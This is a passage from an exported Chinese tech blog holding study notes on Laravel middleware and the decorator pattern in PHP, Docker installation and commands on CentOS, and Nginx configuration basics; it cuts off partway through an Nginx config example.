class="string">'&lt;br&gt;'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$xiaofang = <span class="keyword">new</span> XiaoFang (<span class="number">1</span> 小芳 <span class="number">1</span>);</span><br><span class="line">$shoes = <span class="keyword">new</span> Shoes($xiaofang);</span><br><span class="line">$skirt = <span class="keyword">new</span> Skirt($shoes);</span><br><span class="line">$fire = <span class="keyword">new</span> Fire ($skirt);</span><br><span class="line">$fire-&gt;display ();</span><br><span class="line">输出：</span><br><span class="line">岀门前先整理头发</span><br><span class="line">穿上裙子</span><br><span class="line">穿上鞋子</span><br><span class="line">我是小芳，我出门了</span><br><span class="line">出门后再整理一下头发</span><br></pre></td></tr></table></figure>
<p>我们假设小芳接到一个电话算是请求，而小芳出门是对请求的响应，那么在小芳出门 前后要对自己进行打扮，对应于Laravel框架中，这些打扮的步骤就相当于中间件的功能， 而小芳出门是对请求的真正响应。在小芳打扮的过程中，可以随时增加新的打扮类，只要该 类继承Finery类（装饰类）并调用父类的同名方法，就可以在实现时重新组织打扮过程，实 现打扮步骤的增加或减少，例如加一件衣服、化个妆等。这就是装饰者模式的应用场景。</p>
<p>上面的输岀内容是Laravel框架对请求处理的部分流程，这里面大部分与上一节中装饰 者模式形式相似，但通过回调函数生成整个处理流程的过程还是比较难以理解。这里给一个 简单的实例用于理解，代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Step</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">go</span><span class="params">(Closure $next)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FirstStep</span> <span class="keyword">implements</span> <span class="title">Step</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">go</span><span class="params">(Closure $next)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"开启 session,获取数据"</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">		$next ();</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"保存数据,关闭 session"</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;	</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">goFun</span><span class="params">($step, $className)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span><span class="params">($stepx $className)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $className::go($step);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">then</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$steps = [MFirstStepn];</span><br><span class="line">	$prepare = <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;<span class="keyword">echo</span> <span class="string">"请求向路由器传递，返回响应"</span>；&#125;</span><br><span class="line">	$go = array_reduce($steps, ngoFunH, $prepare);</span><br><span class="line">	$go()；</span><br><span class="line">&#125;</span><br><span class="line">then ();</span><br><span class="line">输出：</span><br><span class="line">开启session，获取数据</span><br><span class="line">请求向路由器传递，返回响应</span><br><span class="line">保存数据，关闭session</span><br></pre></td></tr></table></figure>
<h2 id="请求到响应的生命周期"><a class="markdownIt-Anchor" href="#请求到响应的生命周期"></a> 请求到响应的生命周期</h2>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>后端开发</tag>
        <tag>Laravel</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker学习笔记</title>
    <url>/2020/06/27/1/</url>
    <content><![CDATA[<p><img src="/2020/06/27/1/docker.png" alt></p>
<a id="more"></a>
<h2 id="docker是什么"><a class="markdownIt-Anchor" href="#docker是什么"></a> Docker是什么</h2>
<p>将程序、开发环境、配置打包放到一个容器中，不需要在部署时进行环境的配置。解决了运行环境和配置问题软件容器，方便做持续集成并有助于整体发布的容器虚拟化技术。</p>
<p>Docker是基于Go语言实现的云开源项目。</p>
<p>Docker的主要目标是“Build，Ship and Run Any App，Anywhere”，也就是对应用组件进行封装、分发、部署、运行等生命周期的管理，使用户的APP（可以是一个WEB应用或数据库应用等等）及其运行环境能够做到“一次封装，到处运行”。</p>
<p><strong>Docker包含两方面技术：</strong></p>
<p>镜像技术：“镜像即应用”，（运行文档、配置环境、运行环境、运行依赖包、操作系统发行版、内核）</p>
<h2 id="docker能做什么"><a class="markdownIt-Anchor" href="#docker能做什么"></a> Docker能做什么</h2>
<h3 id="之前的虚拟机技术"><a class="markdownIt-Anchor" href="#之前的虚拟机技术"></a> 之前的虚拟机技术：</h3>
<p>虚拟机就是带环境安装的一种解决方案。</p>
<p>它可以在一种操作系统里面运行另一种操作系统，比如在Windows系统里面运行Linux系统。应用程序对此毫无感知，因为虚拟机看上去跟真实系统一模一样，而对于底层系统来说，虚拟机就是一个普通文件，不需要了就删掉，对其他部分毫无影响，这类虚拟机完美地运行了另一套系统，能够使应用程序，操作系统和硬件三者之间逻辑不变。</p>
<h3 id="容器虚拟化技术"><a class="markdownIt-Anchor" href="#容器虚拟化技术"></a> 容器虚拟化技术</h3>
<p>Linux发展出了另一种虚拟化技术：Linux容器（Linux Containers 简写为LXC）。</p>
<p><strong>Linux容器不是模拟一个完整的操作系统</strong>，而是对进程进行隔离。有了容器，就可以将软件运行时所需的所有资源打包到一个隔离的容器中。容器与虚拟机不同，不需要捆绑一整套操作系统，只需要将软件工作所需的库资源和设置。系统因此而变得高效轻量并保证部署在任何环境下的软件都能始终如一地运行。</p>
<h3 id="开发运维devops"><a class="markdownIt-Anchor" href="#开发运维devops"></a> 开发/运维（DevOps）</h3>
<p>开发者自己运维</p>
<p><strong>一次构建、随处运行</strong></p>
<h2 id="docker的安装"><a class="markdownIt-Anchor" href="#docker的安装"></a> Docker的安装</h2>
<h3 id="centos-docker安装"><a class="markdownIt-Anchor" href="#centos-docker安装"></a> CentOS Docker安装</h3>
<p>Docker支持以下的CentOS版本：</p>
<p>CentOS 7（64bit）</p>
<p>CentOS 6.5 （64bit）或更高版本</p>
<h3 id="前提条件"><a class="markdownIt-Anchor" href="#前提条件"></a> 前提条件</h3>
<p>目前，CentOS仅发行版中的内核支持Docker。</p>
<p>Docker运行在CentOS 7上，要求系统为64位，系统内核版本为3.10以上。</p>
<p>Docker运行在CentOS 6.5或更高版本的CentOS上，要求系统为64位，系统内核版本为2.6.32-431或者更高版本。</p>
<p>使用<code>uname -r</code>查看CentOS版本。</p>
<h3 id="docker的基本组成"><a class="markdownIt-Anchor" href="#docker的基本组成"></a> Docker的基本组成</h3>
<p><strong>镜像（image）<strong>就是一个</strong>只读</strong>的模板，镜像可以用来创建Docker容器，一个镜像可以创建很多容器。</p>
<p>**容器（container）**Docker利用容器独立运行的一个或一组应用。容器是镜像创建的运行实例。它可以被启动、开始、停止、删除。每个容器都是互相隔离的、保证安全的平台。</p>
<p>可以把容器看成是一个简易版的Linux环境（包括root用户权限、进程空间、用户空间和网络空间等）和运行在其中的应用程序。</p>
<p>容器的定义和镜像几乎一模一样，也是一堆层的统一视角，唯一区别在于容器的最上面那一层是可读可写的。</p>
<p>**仓库（repository）**是集中存放镜像文件的地方。仓库（repository）和仓库注册服务器（registry）是有区别的。仓库注册服务器上往往存放着多个仓库，每个仓库又包含了多个镜像，每个镜像有不同的标签（tag）。</p>
<h2 id="centos-7安装docker"><a class="markdownIt-Anchor" href="#centos-7安装docker"></a> CentOS 7安装Docker</h2>
<p><strong>使用命令查看CentOS的版本：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/redhat-release</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">CentOS Linux release 7.3.1611 (Core)</span><br></pre></td></tr></table></figure>
<p><strong>安装gcc：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum -y install gcc</span><br><span class="line">yum -y install gcc-c++</span><br></pre></td></tr></table></figure>
<p><strong>如果安装过Docker则需要删除软件包：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum remove docker \</span><br><span class="line">                  docker-client \</span><br><span class="line">                  docker-client-latest \</span><br><span class="line">                  docker-common \</span><br><span class="line">                  docker-latest \</span><br><span class="line">                  docker-latest-logrotate \</span><br><span class="line">                  docker-logrotate \</span><br><span class="line">                  docker-engine</span><br></pre></td></tr></table></figure>
<p>如果未安装过Docker，则会有以下提示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Loaded plugins: fastestmirror</span><br><span class="line">No Match for argument: docker</span><br><span class="line">No Match for argument: docker-client</span><br><span class="line">No Match for argument: docker-client-latest</span><br><span class="line">No Match for argument: docker-common</span><br><span class="line">No Match for argument: docker-latest</span><br><span class="line">No Match for argument: docker-latest-logrotate</span><br><span class="line">No Match for argument: docker-logrotate</span><br><span class="line">No Match for argument: docker-engine</span><br><span class="line">No Packages marked for removal</span><br></pre></td></tr></table></figure>
<p><strong>安装Docker CE：</strong></p>
<p><strong>通过添加仓库安装：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum install -y yum-utils</span><br><span class="line">sudo yum-config-manager \</span><br><span class="line">    --add-repo \</span><br><span class="line">    https://download.docker.com/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure>
<p>国外服务器太慢可以切换到阿里云的源：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum-config-manager \ </span><br><span class="line">--add-repo \</span><br><span class="line">http://mirrors.aliyun.com/dockerce/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure>
<p>查看源文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/yum.repos.d/docker-ce.repo</span><br></pre></td></tr></table></figure>
<p>更新yum软件包索引：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum makecache fast</span><br></pre></td></tr></table></figure>
<p>安装Docker CE：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum -y install docker-ce</span><br></pre></td></tr></table></figure>
<p>查看Docker版本：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker version</span><br></pre></td></tr></table></figure>
<p>启动Docker：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>
<p>首次运行hello world：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Unable to find image &#39;hello-world:latest&#39; locally</span><br><span class="line">latest: Pulling from library&#x2F;hello-world</span><br><span class="line">0e03bdcc26d7: Pull complete </span><br><span class="line">Digest: sha256:d58e752213a51785838f9eed2b7a498ffa1cb3aa7f946dda11af39286c3db9a9</span><br><span class="line">Status: Downloaded newer image for hello-world:latest</span><br><span class="line"></span><br><span class="line">Hello from Docker!</span><br><span class="line">This message shows that your installation appears to be working correctly.</span><br><span class="line"></span><br><span class="line">To generate this message, Docker took the following steps:</span><br><span class="line"> 1. The Docker client contacted the Docker daemon.</span><br><span class="line"> 2. The Docker daemon pulled the &quot;hello-world&quot; image from the Docker Hub.</span><br><span class="line">    (amd64)</span><br><span class="line"> 3. The Docker daemon created a new container from that image which runs the</span><br><span class="line">    executable that produces the output you are currently reading.</span><br><span class="line"> 4. The Docker daemon streamed that output to the Docker client, which sent it</span><br><span class="line">    to your terminal.</span><br><span class="line"></span><br><span class="line">To try something more ambitious, you can run an Ubuntu container with:</span><br><span class="line"> $ docker run -it ubuntu bash</span><br><span class="line"></span><br><span class="line">Share images, automate workflows, and more with a free Docker ID:</span><br><span class="line"> https:&#x2F;&#x2F;hub.docker.com&#x2F;</span><br><span class="line"></span><br><span class="line">For more examples and ideas, visit:</span><br><span class="line"> https:&#x2F;&#x2F;docs.docker.com&#x2F;get-started&#x2F;</span><br></pre></td></tr></table></figure>
<p>查看镜像：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">hello-world         latest              bf756fb1ae65        5 months ago        13.3kB</span><br></pre></td></tr></table></figure>
<p><strong>配置镜像加速：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p /etc/docker</span><br><span class="line">vim /etc/docker/daemon.json</span><br><span class="line">(配置网易云或者阿里云镜像加速)</span><br><span class="line"><span class="meta">#</span><span class="bash">网易</span></span><br><span class="line">&#123;</span><br><span class="line">    "registry-mirrors":["http://hub-mirror.c.163.com"]</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash">阿里云</span></span><br><span class="line">&#123;</span><br><span class="line">	"registry-mirrors":["https://&#123;自己的编码&#125;.mirror.aliyuncs.com"]</span><br><span class="line">&#125;</span><br><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>
<h2 id="docker运行底层原理"><a class="markdownIt-Anchor" href="#docker运行底层原理"></a> Docker运行底层原理</h2>
<p>（1）docker有着比虚拟机更少的抽象层，由于docker不需要Hypervisor实现硬件资源虚拟化，运行在docker容器上的程序直接使用的都是实际物理机的硬件资源。因此在CPU、内存利用率上docker将会在效率上有明显优势。</p>
<p>（2）docker利用的是宿主机的内核，而不需要Guest OS。因此，当新建一个容器时，docker不需要和虚拟机一样重新加载一个操作系统内核。仍可避免引寻、加载操作系统内核返个比较费时费资源的过程，当新建一个虚拟机时，虚拟机软件需要加载Guest OS,返个新建过程是分钟级别的。而docker由于直接利用宿主机的操作系统，则省略了返个过程，因此新建一个docker容器只需要几秒钟。</p>
<h2 id="docker常用命令"><a class="markdownIt-Anchor" href="#docker常用命令"></a> Docker常用命令</h2>
<h3 id="docker帮助命令"><a class="markdownIt-Anchor" href="#docker帮助命令"></a> Docker帮助命令</h3>
<p><strong>docker version</strong></p>
<p><strong>docker info</strong></p>
<p><strong>docker --help</strong></p>
<h3 id="docker镜像命令"><a class="markdownIt-Anchor" href="#docker镜像命令"></a> Docker镜像命令</h3>
<p><strong>docker images</strong></p>
<p>列出本地主机上的镜像。</p>
<p>选项说明：</p>
<p>-a：列出本地所有的镜像（含中间映像层）</p>
<p>-q：只显示镜像ID。</p>
<p>–digests：显示镜像的摘要信息。</p>
<p>–no-trunc：显示完整的镜像信息。</p>
<p><strong>docker search [OPTIONS] 镜像名字</strong></p>
<p>选项说明：</p>
<p>–no-trunc：显示完整的镜像描述</p>
<p>-s：列出收藏数不小于指定值的镜像。</p>
<p>–automated：只列出automated build类型的镜像</p>
<p><strong>docker pull [OPTIONS] 镜像名字 [:TAG]</strong></p>
<p><strong>docker rmi 删除某个镜像</strong></p>
<h3 id="docker容器命令"><a class="markdownIt-Anchor" href="#docker容器命令"></a> Docker容器命令</h3>
<p>**新建并启动一个容器：**docker run [OPTIONS] IMAGE [COMMAND] [ARG…]</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -it centos</span><br></pre></td></tr></table></figure>
<p><strong>列出当前所有正在运行的容器</strong></p>
<p>docker ps [OPTIONS]</p>
<p>OPTIONS说明（常用）</p>
<p>-a：列出当前所有正在运行的容器+历史运行过的</p>
<p>-l：显示最近创建的容器</p>
<p>-n：显示最近n个创建的容器</p>
<p>-q：静默模式，只显示容器编号</p>
<p>–not-trunc：不截断输出</p>
<p><strong>退出容器</strong></p>
<p>exit：容器停止退出</p>
<p>ctrl+P+Q：容器不停止退出</p>
<p><strong>启动容器</strong></p>
<p>docker start 容器ID或者容器名</p>
<p><strong>重启容器</strong></p>
<p>docker restart 容器ID或者容器名</p>
<p><strong>停止容器</strong></p>
<p>docker stop 容器ID或者容器名</p>
<p><strong>强制停止容器</strong></p>
<p>docker kill 容器ID或者容器名</p>
<p><strong>删除容器</strong></p>
<p>docker rm 容器ID或者容器名</p>
<p><strong>一次性删除多个容器</strong></p>
<p>docker rm -f $(docker ps -a -q)</p>
<p>docker ps -a -1 | xargs docker rm</p>
<h3 id="重要命令"><a class="markdownIt-Anchor" href="#重要命令"></a> 重要命令</h3>
<p><strong>启动守护式容器：</strong></p>
<p>docker run -d</p>
<p><strong>查看容器日志：</strong></p>
<p>docker logs -f -t --tail 容器ID</p>
<p><strong>显示docker内部进程</strong></p>
<p>docker top 容器ID</p>
<p><strong>查看容器内部细节</strong></p>
<p>docker inspect 容器ID</p>
<p><strong>进入正在运行的容器并以命令行交互</strong></p>
<p>docker exex -it 容器ID bashShell</p>
<p>重新进入docker attach 容器ID</p>
<p><strong>上述两者区别：</strong></p>
<p>attach直接进入容器启动命令的终端，不会启动新的进程</p>
<p>exec是在容器中打开新的终端，并且可以启动新的进程</p>
<p><strong>从容器内拷贝文件到主机上</strong></p>
<p>docker cp 容器ID：容器内路径 目的主机路径</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker cp id: /tmp/log /root</span><br></pre></td></tr></table></figure>
<h2 id="docker镜像"><a class="markdownIt-Anchor" href="#docker镜像"></a> Docker镜像</h2>
<p>镜像是一种轻量级、可执行的独立软件包，用来打包软件运行环境和基于运行环境开发的软件，它包含运行某个软件所需的所有内容，包括代码、运行时、库、环境变量和配置文件。</p>
<h3 id="unionfs联合文件系统"><a class="markdownIt-Anchor" href="#unionfs联合文件系统"></a> UnionFS（联合文件系统）</h3>
<p>联合文件系统（Union File System）：2004年由纽约州立大学石溪分校开发，它可以把多个目录(也叫分支)内容联合挂载到同一个目录下，而目录的物理位置是分开的。UnionFS允许只读和可读写目录并存，就是说可同时删除和增加内容。UnionFS应用的地方很多，比如在多个磁盘分区上合并不同文件系统的主目录，或把几张CD光盘合并成一个统一的光盘目录(归档)。另外，具有写时复制(copy-on-write)功能UnionFS可以把只读和可读写文件系统合并在一起，虚拟上允许只读文件系统的修改可以保存到可写文件系统当中。</p>
<p>特性：一次同时加载多个文件系统，但从外面看起来，只能看到一个文件系统，联合加载会把各层文件叠加起来，这样最终的文件系统会包含所有底层的文件和目录。</p>
<h3 id="镜像加载原理"><a class="markdownIt-Anchor" href="#镜像加载原理"></a> 镜像加载原理</h3>
<p>rootfs和bootfs</p>
<p>任何程序运行时都会有依赖，无论是开发语言层的依赖库，还是各种系统lib、操作系统等，不同的系统上这些库可能是不一样的，或者有缺失的。为了让容器运行时一致，docker将依赖的操作系统、各种lib依赖整合打包在一起（即镜像），然后容器启动时，作为它的根目录（根文件系统rootfs），使得容器进程的各种依赖调用都在这个根目录里，这样就做到了环境的一致性。</p>
<p>不过，这时你可能已经发现了另一个问题：<strong>难道每开发一个应用，都要重复制作一次rootfs吗（那每次pull/push一个系统岂不疯掉）？</strong></p>
<p>比如，我现在用Debian操作系统的ISO做了一个rootfs，然后又在里面安装了Golang环境，用来部署我的应用A。那么，我的另一个同事在发布他的Golang应用B时，希望能够直接使用我安装过Golang环境的rootfs，而不是重复这个流程，那么本文的主角UnionFS就派上用场了。</p>
<p><strong>Docker镜像的设计中，引入了层（layer）的概念</strong>，也就是说，用户制作镜像的每一步操作，都会生成一个层，也就是一个增量rootfs（一个目录），这样应用A和应用B所在的容器共同引用相同的Debian操作系统层、Golang环境层（作为只读层），而各自有各自应用程序层，和可写层。启动容器的时候通过UnionFS把相关的层挂载到一个目录，作为容器的根文件系统。</p>
<p>需要注意的是，rootfs只是一个操作系统所包含的文件、配置和目录，并不包括操作系统内核。这就意味着，如果你的应用程序需要配置内核参数、加载额外的内核模块，以及跟内核进行直接的交互，你就需要注意了：<strong>这些操作和依赖的对象，都是宿主机操作系统的内核，它对于该机器上的所有容器来说是一个“全局变量”，牵一发而动全身。</strong></p>
<h3 id="docker镜像commit操作"><a class="markdownIt-Anchor" href="#docker镜像commit操作"></a> Docker镜像commit操作</h3>
<p>docker commit 提交容器副本使之成为新的镜像</p>
<p>docker commit -m=“提交的描述信息” -a=“作者” 容器ID 要创建的目标镜像名：[标签名]</p>
<p>docker run -it p 8080:8080 tomcat</p>
<h2 id="容器数据卷"><a class="markdownIt-Anchor" href="#容器数据卷"></a> 容器数据卷</h2>
<p>容器的持久化、容器间继承和共享数据。</p>
<h3 id="作用"><a class="markdownIt-Anchor" href="#作用"></a> 作用</h3>
<p>1.数据卷可在容器之间共享或重用数据</p>
<p>2.卷中的更改可以直接生效</p>
<p>3.数据卷中的更改不会包含在镜像的更新中</p>
<p>4.数据卷的生命周期一直持续到没有容器使用它为止</p>
<h3 id="容器内添加数据卷"><a class="markdownIt-Anchor" href="#容器内添加数据卷"></a> 容器内添加数据卷</h3>
<h4 id="直接命令添加"><a class="markdownIt-Anchor" href="#直接命令添加"></a> 直接命令添加</h4>
<p>docker run -it -v /宿主机绝对路径目录:/容器内目录 镜像名</p>
<p>命令（带权限）:docker run -it -v /宿主机绝对路径目录:/容器内目录:ro 镜像名  (read only)</p>
<h4 id="容器是否挂载成功"><a class="markdownIt-Anchor" href="#容器是否挂载成功"></a> 容器是否挂载成功</h4>
<p>docker inspect 容器ID 获取JSON格式的配置</p>
<p>Volumes字段</p>
<h3 id="dockerfile添加"><a class="markdownIt-Anchor" href="#dockerfile添加"></a> Dockerfile添加</h3>
<p>**Dockerfile:**描述镜像的文件</p>
<p>VOLUME:[&quot;/dataVoumeContainer&quot;,&quot;/dataVolumeContainer2&quot;,&quot;/dataVolumeContainer3&quot;]</p>
<p><strong>说明：</strong></p>
<p>出于可移植和分享的考虑，用-v 主机目录：容器目录这种方法不能够直接在Dockerfile里实现。</p>
<p>由于宿主机目录是依赖于特定宿主机的，并不能够保证在所有的宿主机上都存在这样的特定目录。</p>
<p><strong>步骤：</strong></p>
<p><strong>根目录下新建mydocker文件夹并进入</strong></p>
<p><strong>可在Dockerfile中使用VOLUME指令来给镜像添加一个或多个数据卷</strong></p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># volume test</span></span><br><span class="line"><span class="keyword">FROM</span> centos</span><br><span class="line"><span class="keyword">VOLUME</span><span class="bash"> [<span class="string">"dataVolumeContainer1"</span>,<span class="string">"/dataVolumeContainer2"</span>]</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"fininsher,-------success1"</span></span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> /bin/bash</span></span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line">docker <span class="keyword">run</span><span class="bash"> -it -v /host1:/dataVolumeContainer1 -v /host2:/dataVolumeContainer2 centos /bin/bash</span></span><br></pre></td></tr></table></figure>
<p><strong>File构建</strong></p>
<p><strong>build后生成镜像 —获得一个新镜像</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker build -f &#x2F;mydocker&#x2F;dockerfile2 -t zzyy&#x2F;centos.</span><br></pre></td></tr></table></figure>
<p><strong>run容器</strong></p>
<p>通过上述步骤，容器内的卷目录地址已经知道对应的主机目录地址</p>
<p>Docker images ====&gt; DockerFile</p>
<h2 id="数据卷容器"><a class="markdownIt-Anchor" href="#数据卷容器"></a> 数据卷容器</h2>
<p>命名的容器挂载数据卷，其它容器通过挂载这个（父容器）实现数据共享，挂载数据卷的容器，称之为数据卷容器。</p>
<p>以上一步新建的镜像zzyy/centos为模板并运行容器dc01/dc02/dc03</p>
<p>它们已经有容器卷<code>/dataVolumeContainer1 /dataVolumeContainer2</code></p>
<p>容器间传递共享（–volumes-from）</p>
<p>先启动一个父容器dc01  在dataVolumeContainer2新增内容</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>服务器</tag>
        <tag>Docker</tag>
        <tag>后端开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx学习笔记</title>
    <url>/2020/06/26/1/</url>
    <content><![CDATA[<p><img src="/2020/06/26/1/nginx.png" alt></p>
<a id="more"></a>
<h2 id="nginx基本概念"><a class="markdownIt-Anchor" href="#nginx基本概念"></a> Nginx基本概念：</h2>
<p>一个高性能HTTP和反向代理web服务器，专为性能优化而开发。</p>
<p>**反向代理：**我么只需要将请求发送到反向代理服务器，由反向代理服务器去选择目标服务器获取数据后，再返回给客户端，此时反向代理服务器和目标服务器对外就是一个服务器，暴露的是代理服务器地址，隐藏了真实服务器IP地址。</p>
<p>正向代理：把局域网外的Internet想象成一个巨大的资源库，则局域网中的客户端要访问Internet，则需要通过代理服务器来访问，这种代理服务就称为正向代理。</p>
<p><strong>负载均衡：<strong>单个服务器解决不了，我们增加服务器的数量，然后将请求分发到各个服务器上，将原先请求集中到单个服务器上的情况改为将请求分发到多个服务器上，将负载分发到不同的服务器，也就是</strong>负载均衡</strong>。</p>
<p>**动静分离：**为了加快网站的解析速度，可以把动态页面和静态页面有不同的服务器来解析，加快解析速度，降低原来单个服务器的压力。</p>
<h2 id="nginx操作的常用命令"><a class="markdownIt-Anchor" href="#nginx操作的常用命令"></a> Nginx操作的常用命令：</h2>
<p>**查看nginx版本号：**nginx -v</p>
<p>**启动nginx：**nginx</p>
<p>**关闭nginx：**nginx -s stop</p>
<p>**重新加载命令：**nginx -s reload</p>
<h2 id="nginx配置文件"><a class="markdownIt-Anchor" href="#nginx配置文件"></a> Nginx配置文件：</h2>
<p><code>/etc/nginx/nginx.conf</code></p>
<h3 id="第一部分全局块"><a class="markdownIt-Anchor" href="#第一部分全局块"></a> 第一部分：全局块</h3>
<p>从配置文件开始到events块之间的内容，主要会设置一些影响nginx服务器整体运行的配置指令，主要包括配置运行nginx服务器的用户（组）、允许生成的worker process数，进程 PID 存放路径、日志存放路径和类型以及配置文件的引入等。</p>
<h3 id="第二部分event块"><a class="markdownIt-Anchor" href="#第二部分event块"></a> 第二部分：event块</h3>
<p>events块涉及的指令主要影响Nginx服务器与用户的网络连接，常用的设置包括是否开启对多work process下的网络连接进行序列化，是否允许同时接受多个网络连接，选取哪种事件驱动模型来处理连接请求，每个word process可以同时支持的最大连接数等。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">events &#123;</span><br><span class="line">    worker_connections 1024;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>支持的最大连接数。</p>
<h3 id="第三部分http块"><a class="markdownIt-Anchor" href="#第三部分http块"></a> 第三部分：http块</h3>
<p>是Nginx服务器配置中最频繁的部分，代理、缓存和日志定义等绝大多数功能和第三方模块的配置都在这里。</p>
<p>http块也可以包括http全局块和server块。</p>
<p>**server块：**这和虚拟主机有密切关系，虚拟主机从用户角度看，和一台独立的硬件主机是完全一样的，该技术的忏悔说呢过是为了节省互联网服务器硬件成本。</p>
<p>每个http块可以包括多个server块，而每个server块就相当于一个虚拟主机。</p>
<p>而每个server块也分为全局server块，以及可以同时包含多个location块。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span>       <span class="number">80</span> default_server;</span><br><span class="line">        <span class="attribute">listen</span>       [::]:<span class="number">80</span> default_server;</span><br><span class="line">        <span class="attribute">server_name</span>  </span><br><span class="line">        root         /usr/share/nginx/html;</span><br><span class="line">	<span class="attribute">default_type</span> <span class="string">'text/html'</span>;</span><br><span class="line">	<span class="attribute">charset</span> utf-<span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Load configuration files for the default server block.</span></span><br><span class="line"></span><br><span class="line">​        include /etc/nginx/default.d/*.conf;</span><br><span class="line"></span><br><span class="line">​        location / &#123;</span><br><span class="line">​		index index.html index.php index.htm;</span><br><span class="line">​		charset utf-8;</span><br><span class="line">​        &#125;</span><br><span class="line"></span><br><span class="line">​        error_page 404 /404.html;</span><br><span class="line">​            location = /40x.html &#123;</span><br><span class="line">​        &#125;</span><br><span class="line"></span><br><span class="line">​        error_page 500 502 503 504 /50x.html;</span><br><span class="line">​            location = /50x.html &#123;</span><br><span class="line">​        &#125;</span><br><span class="line">​	location ~ \.php$ &#123;</span><br><span class="line">​		fastcgi_pass 127.0.0.1:9000;</span><br><span class="line">​		fastcgi_index index.php;</span><br><span class="line">​		fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;</span><br><span class="line">​		include       fastcgi_params;</span><br><span class="line">​	&#125;</span><br><span class="line">​    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="详解"><a class="markdownIt-Anchor" href="#详解"></a> 详解：</h3>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#定义Nginx运行的用户和用户组</span></span><br><span class="line"><span class="attribute">user</span> www www; </span><br><span class="line"></span><br><span class="line"><span class="comment">#nginx进程数，通常设置成和cpu的数量相等</span></span><br><span class="line"><span class="attribute">worker_processes</span> <span class="number">4</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">#全局错误日志定义类型，[debug | info | notice | warn | error | crit]</span></span><br><span class="line"><span class="comment">#error_log  logs/error.log;</span></span><br><span class="line"><span class="comment">#error_log  logs/error.log  notice;</span></span><br><span class="line"><span class="comment">#error_log  logs/error.log  info;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#进程pid文件</span></span><br><span class="line"><span class="comment">#pid        logs/nginx.pid;</span></span><br><span 